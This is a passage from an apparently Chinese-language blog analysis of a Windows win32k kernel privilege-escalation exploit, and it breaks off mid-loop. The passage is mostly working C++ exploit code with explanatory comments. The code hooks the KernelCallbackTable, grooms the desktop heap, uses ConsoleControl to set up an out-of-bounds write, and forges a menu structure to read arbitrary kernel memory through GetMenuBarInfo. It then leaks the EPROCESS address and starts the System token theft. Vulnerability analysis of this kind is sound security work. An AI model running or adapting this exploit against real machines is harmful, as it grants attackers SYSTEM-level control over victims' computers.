地址</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *pfOutHMValidateHandle != <span class="literal">NULL</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>200 - 204 行将 KernelCallbackTable 的 123、124 项替换成自己的挂钩函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtect</span>((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>, <span class="number">0x400</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);		<span class="comment">// 给 KernelCallbackTable 所在的内存添加可写权限</span></span><br><span class="line">*(ULONG_PTR*)((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>) = (ULONG_PTR)MyxxxClientAllocWindowClassExtraBytes;	<span class="comment">// hook 123 项</span></span><br><span class="line">*(ULONG_PTR*)((PBYTE)pKernelCallbackTable + <span class="number">0x3E0</span>) = (ULONG_PTR)MyxxxClientFreeWindowClassExtraBytes;	<span class="comment">// hook 124 项，调试用</span></span><br><span class="line"><span class="built_in">VirtualProtect</span>((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>, <span class="number">0x400</span>, dwOldProtect, &amp;dwOldProtect);	<span class="comment">// 还原内存权限</span></span><br></pre></td></tr></table></figure>

<p>第 123 项的 hook 函数等到下面用到时再贴出来。第 124 项的 hook 应该是作者为了调试 EXP 而加的，其 hook 函数原封不动地调用了原函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">MyxxxClientFreeWindowClassExtraBytes</span><span class="params">(PVOID pInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID pAddress = *(PVOID*)((PBYTE)pInfo + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">g_fxxxClientFreeWindowClassExtraBytes</span>(pInfo);	<span class="comment">// 调用原函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>206 - 221 行注册了两个窗口类，两个窗口类的主要区别是 cbWndExtra 的大小：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ATOM atom1, atom2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">WNDCLASSEX WndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WndClass.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(WNDCLASSEX);</span><br><span class="line">WndClass.lpfnWndProc = DefWindowProc;	<span class="comment">// 使用默认窗口过程</span></span><br><span class="line">WndClass.style = CS_VREDRAW| CS_HREDRAW;</span><br><span class="line">WndClass.cbWndExtra = <span class="number">0x20</span>;				<span class="comment">// Class1 窗口扩展内存的大小为 0x20</span></span><br><span class="line">WndClass.hInstance = hInstance;</span><br><span class="line">WndClass.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">WndClass.lpszClassName = <span class="string">L&quot;Class1&quot;</span>;		<span class="comment">// 窗口类名为 Class1</span></span><br><span class="line">atom1 = <span class="built_in">RegisterClassEx</span>(&amp;WndClass); 	<span class="comment">// 注册 Class1</span></span><br><span class="line"></span><br><span class="line">WndClass.cbWndExtra = g_dwMyWndExtra;	<span class="comment">// Class2 窗口扩展内存的大小为 0x1234</span></span><br><span class="line">WndClass.hInstance = hInstance;</span><br><span class="line">WndClass.lpszClassName = <span class="string">L&quot;Class2&quot;</span>;		<span class="comment">// 窗口类名为 Class2</span></span><br><span class="line">atom2 = <span class="built_in">RegisterClassEx</span>(&amp;WndClass);		<span class="comment">// 注册 Class2</span></span><br></pre></td></tr></table></figure>

<p>223 - 287 行通过创建/销毁窗口，正式进行内核桌面堆布局：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR dwpWnd0_to_pWnd1_kernel_heap_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> nTry = <span class="number">0</span>; nTry &lt; <span class="number">5</span>; nTry++) &#123;	<span class="comment">// 最多尝试 5 次内存布局</span></span><br><span class="line">    HMENU hMenu = <span class="literal">NULL</span>;</span><br><span class="line">    HMENU hHelpMenu = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 创建 50 个窗口</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1</span>) &#123;	<span class="comment">// i = 1 时创建一个菜单 hMenu</span></span><br><span class="line">            hMenu = <span class="built_in">CreateMenu</span>();</span><br><span class="line">            hHelpMenu = <span class="built_in">CreateMenu</span>();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">AppendMenu</span>(hHelpMenu, MF_STRING, <span class="number">0x1888</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;about&quot;</span>));	<span class="comment">// 准备一个 Item</span></span><br><span class="line">            <span class="built_in">AppendMenu</span>(hMenu, MF_POPUP, (LONG)hHelpMenu, <span class="built_in">TEXT</span>(<span class="string">&quot;help&quot;</span>));	<span class="comment">// 为菜单添加 Item</span></span><br><span class="line">        &#125;</span><br><span class="line">        g_hWnd[i] = <span class="built_in">CreateWindowEx</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Class1&quot;</span>, <span class="literal">NULL</span>, WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>, hMenu, hInstance, <span class="literal">NULL</span>);	<span class="comment">// 创建窗口，只有窗口 0 没有菜单</span></span><br><span class="line">        g_pWnd[i] = (ULONG_PTR)<span class="built_in">fHMValidateHandle</span>(g_hWnd[i], <span class="number">1</span>); <span class="comment">// 泄露每个窗口 tagWNDk 在用户空间的映射指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 销毁掉后 48 个窗口，使它们 tagWNDk 占用的桌面堆块处于空闲状态，再创建窗口时很有可能再用到这些空闲的堆块</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_hWnd[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>((HWND)g_hWnd[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ptagWNDk + 8 保存了 tagWNDk 相对于桌面堆基址的偏移</span></span><br><span class="line">    g_dwpWndKernel_heap_offset0 = *(ULONG_PTR*)((PBYTE)g_pWnd[<span class="number">0</span>] + g_dwKernel_pWnd_offset);</span><br><span class="line">    g_dwpWndKernel_heap_offset1 = *(ULONG_PTR*)((PBYTE)g_pWnd[<span class="number">1</span>] + g_dwKernel_pWnd_offset);</span><br><span class="line">    <span class="comment">// 对窗口 0 调用 ConsoleControl，使其 pExtraBytes 处于 offset 间接寻址模式</span></span><br><span class="line">    ULONG_PTR ChangeOffset = <span class="number">0</span>;</span><br><span class="line">    ULONG_PTR ConsoleCtrlInfo[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;			<span class="comment">// 参数长度为 0x10 字节</span></span><br><span class="line">    ConsoleCtrlInfo[<span class="number">0</span>] = (ULONG_PTR)g_hWnd[<span class="number">0</span>];		<span class="comment">// 参数信息的第一个 8 字节存放窗口句柄</span></span><br><span class="line">    ConsoleCtrlInfo[<span class="number">1</span>] = (ULONG_PTR)ChangeOffset;	<span class="comment">// 第二个 8 字节对利用没有影响</span></span><br><span class="line">    NTSTATUS ret1 = <span class="built_in">g_fNtUserConsoleControl</span>(<span class="number">6</span>, (ULONG_PTR)&amp;ConsoleCtrlInfo, <span class="built_in"><span class="keyword">sizeof</span></span>(ConsoleCtrlInfo));	<span class="comment">// 功能 6</span></span><br><span class="line">    <span class="comment">// 现在窗口 0 重新在桌面堆申请了一片空间作为扩展内存，pExtraBytes 存储其相对于桌面堆基址的偏移</span></span><br><span class="line">    dwpWnd0_to_pWnd1_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[<span class="number">0</span>] + <span class="number">0x128</span>);</span><br><span class="line">    <span class="keyword">if</span> (dwpWnd0_to_pWnd1_kernel_heap_offset &lt; g_dwpWndKernel_heap_offset1) &#123;	<span class="comment">// 需要保证这片新空间地址小于窗口 1 tagWNDk 结构体所在的地址，这样才能通过窗口 0 扩展内存越界修改 tagWNDk1</span></span><br><span class="line">        dwpWnd0_to_pWnd1_kernel_heap_offset = (g_dwpWndKernel_heap_offset1 - dwpWnd0_to_pWnd1_kernel_heap_offset);	<span class="comment">// 记下它们之间的偏移</span></span><br><span class="line">        <span class="keyword">break</span>;		<span class="comment">// 退出循环</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果进了 else，说明这次内存布局失败，回收所有资源</span></span><br><span class="line">        <span class="keyword">if</span> (g_hWnd[<span class="number">0</span>] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>((HWND)g_hWnd[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (g_hWnd[<span class="number">1</span>] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>((HWND)g_hWnd[<span class="number">1</span>]);	</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (hMenu != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">DestroyMenu</span>(hMenu);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (hHelpMenu != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">DestroyMenu</span>(hHelpMenu);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dwpWnd0_to_pWnd1_kernel_heap_offset = <span class="number">0</span>;		<span class="comment">// 重新设置该变量值为 0，进入下次内存布局尝试</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dwpWnd0_to_pWnd1_kernel_heap_offset == <span class="number">0</span>) &#123;		<span class="comment">// 5 次尝试都失败了，退出程序</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Memory layout fail. quit&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建窗口 2，期间调用 hook 函数时，会将 pExtraBytes 改为 offset 间接寻址模式，并赋值为 tagWNDk0 相对于桌面堆基址的偏移</span></span><br><span class="line">HWND hWnd2 = <span class="built_in">CreateWindowEx</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Class2&quot;</span>, <span class="literal">NULL</span>, WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">PVOID pWnd2 = <span class="built_in">fHMValidateHandle</span>(hWnd2, <span class="number">1</span>);	<span class="comment">// 泄露 tagWNDk2 在用户空间的映射指针</span></span><br></pre></td></tr></table></figure>

<p>KernelCallbackTable 的 123 项之前被替换成自定义的 hook 函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">MyxxxClientAllocWindowClassExtraBytes</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span>* pSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pSize == g_dwMyWndExtra) &#123;	<span class="comment">// 只有参数为 0x1234 时，才进行操作。即只有 286 行创建 Class2 的窗口时才会进到这里</span></span><br><span class="line">        ULONG_PTR ululValue = <span class="number">0</span>;</span><br><span class="line">        HWND hWnd2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 搜索释放掉的后 48 个窗口对应的 tagWNDk，寻找新窗口的 tagWNDk 复用了哪个地址（这里应该是 i &lt; 50，不过无伤大雅）</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; <span class="number">48</span>; i++) &#123;</span><br><span class="line">            ULONG_PTR cbWndExtra = *(ULONG_PTR*)(g_pWnd[i] + g_cbWndExtra_offset);	<span class="comment">// 取来每个 cbWndExtra</span></span><br><span class="line">            <span class="keyword">if</span> (cbWndExtra == g_dwMyWndExtra) &#123;			<span class="comment">// 找到新窗口的 tagWNDk</span></span><br><span class="line">                hWnd2 = (HWND)*(ULONG_PTR*)(g_pWnd[i]); <span class="comment">// &amp;tagWNDk + 0 存放窗口句柄</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (hWnd2 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 到这里说明新窗口 tagWNDk 没有复用之前的空间，则输出错误信息，这里再加个结束程序会好些</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Search free 48 kernel mapping desktop heap (cbwndextra == g_dwMyWndExtra) points to hWnd fail.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Search kernel mapping desktop heap points to hWnd: &quot;</span> &lt;&lt; std::hex &lt;&lt; hWnd2 &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 对新窗口（窗口 2）调用 ConsoleControl，使其 pExtraBytes 处于 offset 间接寻址模式</span></span><br><span class="line">        ULONG_PTR ConsoleCtrlInfo[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        ConsoleCtrlInfo[<span class="number">0</span>] = (ULONG_PTR)hWnd2;	<span class="comment">// 第一个 8 字节放窗口句柄</span></span><br><span class="line">        ConsoleCtrlInfo[<span class="number">1</span>] = ululValue;			<span class="comment">// 0</span></span><br><span class="line">        NTSTATUS ret = <span class="built_in">g_fNtUserConsoleControl</span>(<span class="number">6</span>, (ULONG_PTR)&amp;ConsoleCtrlInfo, <span class="built_in"><span class="keyword">sizeof</span></span>(ConsoleCtrlInfo));</span><br><span class="line"></span><br><span class="line">        ULONG_PTR Result[<span class="number">3</span>] = &#123; <span class="number">0</span> &#125;;				<span class="comment">// 返回信息长度为 0x18</span></span><br><span class="line">        Result[<span class="number">0</span>] = g_dwpWndKernel_heap_offset0;	<span class="comment">// 第一个 8 字节会被用于赋值 pExtraBytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">g_fFNtCallbackReturn</span>(&amp;Result, <span class="built_in"><span class="keyword">sizeof</span></span>(Result), <span class="number">0</span>);	<span class="comment">// tagWNDk2.pExtraBytes 语义上指向 tagWNDk0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">g_fxxxClientAllocWindowClassExtraBytes</span>(pSize);	<span class="comment">// 238 行创建 50 个 Class1 的窗口时，都直接调用原函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此布局完毕，桌面堆长这样：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/exp_read/memory_layout/1.png" alt="1"></p>
<br>

<h3 id="任意地址读的实现及封装"><a href="#任意地址读的实现及封装" class="headerlink" title="任意地址读的实现及封装"></a>任意地址读的实现及封装</h3><p>289 - 306 行使得我们具有任意地址读的能力：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetWindowLong</span>(hWnd2, g_cbWndExtra_offset, <span class="number">0x0FFFFFFFF</span>);		<span class="comment">// 将 tagWNDk0.cbWndExtra 改为很大的值，窗口 0 的扩展内存可以越界写</span></span><br><span class="line"><span class="comment">// 想要使用 SetWindowLongPtr 修改 spMenu 的功能（-12），tagWNDk.dwStyle 需要带有 WS_CHILD 属性</span></span><br><span class="line">ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[<span class="number">1</span>] + g_dwExStyle_offset);</span><br><span class="line">ululStyle |= <span class="number">0x4000000000000000</span>L;</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  <span class="comment">// 对窗口 0 调用 SetWindowLongPtr，修改 tagWNDk1.dwStyle，使其带有 WS_CHILD</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造一个 tagMENU，参考 3.6.2 节</span></span><br><span class="line">g_pMyMenu = (ULONG_PTR)<span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, <span class="number">0xA0</span>);</span><br><span class="line">*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x98</span>) = (ULONG_PTR)<span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, <span class="number">0x20</span>);	<span class="comment">// spMenuk</span></span><br><span class="line">**(ULONG_PTR**)((PBYTE)g_pMyMenu + <span class="number">0x98</span>) = g_pMyMenu;	<span class="comment">// spMenuk-&gt;pSelf</span></span><br><span class="line">*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x28</span>) = (ULONG_PTR)<span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, <span class="number">0x200</span>);	<span class="comment">// unknown1</span></span><br><span class="line">*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x58</span>) = (ULONG_PTR)<span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, <span class="number">0x8</span>);		<span class="comment">// rgItems</span></span><br><span class="line">*(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x28</span>) + <span class="number">0x2C</span>) = <span class="number">1</span>;	<span class="comment">// unknown1-&gt;cItems</span></span><br><span class="line">*(DWORD*)((PBYTE)g_pMyMenu + <span class="number">0x40</span>) = <span class="number">1</span>;		<span class="comment">// unknown2</span></span><br><span class="line">*(DWORD*)((PBYTE)g_pMyMenu + <span class="number">0x44</span>) = <span class="number">2</span>;		<span class="comment">// unknown3</span></span><br><span class="line">*(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x58</span>)) = <span class="number">0x4141414141414141</span>;  <span class="comment">// rgItems-&gt;unknown，用到的时候再初始化 </span></span><br><span class="line"><span class="comment">// 修改窗口 1 的 spMenu，同时泄露原 spMenu</span></span><br><span class="line">ULONG_PTR pSPMenu = <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">1</span>], GWLP_ID, (LONG_PTR)g_pMyMenu);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 GetMenuBarInfo 时，tagWNDk.dwStyle 不能包含 WS_CHILD</span></span><br><span class="line">ululStyle &amp;= ~<span class="number">0x4000000000000000</span>L;</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  <span class="comment">// 移除窗口 1 的 WS_CHILD 样式</span></span><br></pre></td></tr></table></figure>

<p>EXP 中通过函数 ReadKernelMemoryQQWORD 封装任意地址读功能，参数 pAddress 为要读的地址 p，ululOutVal1 和 ululOutVal2 存储读出来的 16 字节，其中 <code>ululOutVal1 = *(__int64 *)p</code>，<code>ululOutVal2 = *(__int64 *)(p + 8)</code>，实现如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReadKernelMemoryQQWORD</span><span class="params">(ULONG_PTR pAddress, ULONG_PTR &amp;ululOutVal1, ULONG_PTR &amp;ululOutVal2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MENUBARINFO mbi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    mbi.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(MENUBARINFO);</span><br><span class="line"></span><br><span class="line">    RECT Rect = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">GetWindowRect</span>(g_hWnd[<span class="number">1</span>], &amp;Rect);	<span class="comment">// 获取窗口 1 的 RECT 信息，用于计算读出的真实值</span></span><br><span class="line"></span><br><span class="line">    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x58</span>)) = pAddress - <span class="number">0x40</span>; <span class="comment">// rgItems-&gt;unknown</span></span><br><span class="line">    <span class="built_in">GetMenuBarInfo</span>(g_hWnd[<span class="number">1</span>], <span class="number">-3</span>, <span class="number">1</span>, &amp;mbi);	<span class="comment">// 读取</span></span><br><span class="line"></span><br><span class="line">    BYTE pbKernelValue[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    *(DWORD*)(pbKernelValue) = mbi.rcBar.left - Rect.left;		<span class="comment">// 减去 Rect.left，创建窗口时，该值被指定为 0</span></span><br><span class="line">    *(DWORD*)(pbKernelValue + <span class="number">4</span>) = mbi.rcBar.top - Rect.top;	<span class="comment">// 减去 Rect.top，创建窗口时，该值被指定为 0</span></span><br><span class="line">    *(DWORD*)(pbKernelValue + <span class="number">8</span>) = mbi.rcBar.right - mbi.rcBar.left;</span><br><span class="line">    *(DWORD*)(pbKernelValue + <span class="number">0xc</span>) = mbi.rcBar.bottom - mbi.rcBar.top;</span><br><span class="line"></span><br><span class="line">    ululOutVal1 = *(ULONG_PTR*)(pbKernelValue);			<span class="comment">// 成功读出 pAddress 开始的 16 字节</span></span><br><span class="line">    ululOutVal2 = *(ULONG_PTR*)(pbKernelValue + <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至于为什么要减去那四个值，再来回顾一下 xxxGetMenuBarInfo 中是怎么赋值 mbi 的：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/exp_read/wrap_read_function/1.png" alt="1"></p>
<br>

<h3 id="泄露进程-EPROCESS-地址"><a href="#泄露进程-EPROCESS-地址" class="headerlink" title="泄露进程 EPROCESS 地址"></a>泄露进程 EPROCESS 地址</h3><p>312 - 320 行使用了 <strong>3.6.3 节</strong> 第一种方法来泄露：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR ululValue1 = <span class="number">0</span>, ululValue2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// **(__int64 **)(*(__int64 *)(spMenu + 0x18) + 0x100) 为进程 EPROCESS 结构体地址</span></span><br><span class="line"><span class="built_in">ReadKernelMemoryQQWORD</span>(pSPMenu + <span class="number">0x18</span>, ululValue1, ululValue2);</span><br><span class="line"><span class="built_in">ReadKernelMemoryQQWORD</span>(ululValue1 + <span class="number">0x100</span>, ululValue1, ululValue2);</span><br><span class="line"><span class="built_in">ReadKernelMemoryQQWORD</span>(ululValue1, ululValue1, ululValue2);</span><br><span class="line"></span><br><span class="line">ULONG_PTR pMyEProcess = ululValue1;</span><br><span class="line">std::cout&lt;&lt; <span class="string">&quot;Get current kernel eprocess: &quot;</span> &lt;&lt; pMyEProcess &lt;&lt; std::endl;	<span class="comment">// 输出 EPROCESS 地址到控制台</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="进程权限提升"><a href="#进程权限提升" class="headerlink" title="进程权限提升"></a>进程权限提升</h3><p>322 - 347 行遍历 EPROCESS-&gt;ActiveProcessLinks 链表，找到 System 进程，将其 Token 复制到当前进程：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR pSystemEProcess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ULONG_PTR pNextEProcess = pMyEProcess;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;		<span class="comment">// 用 do...whlie 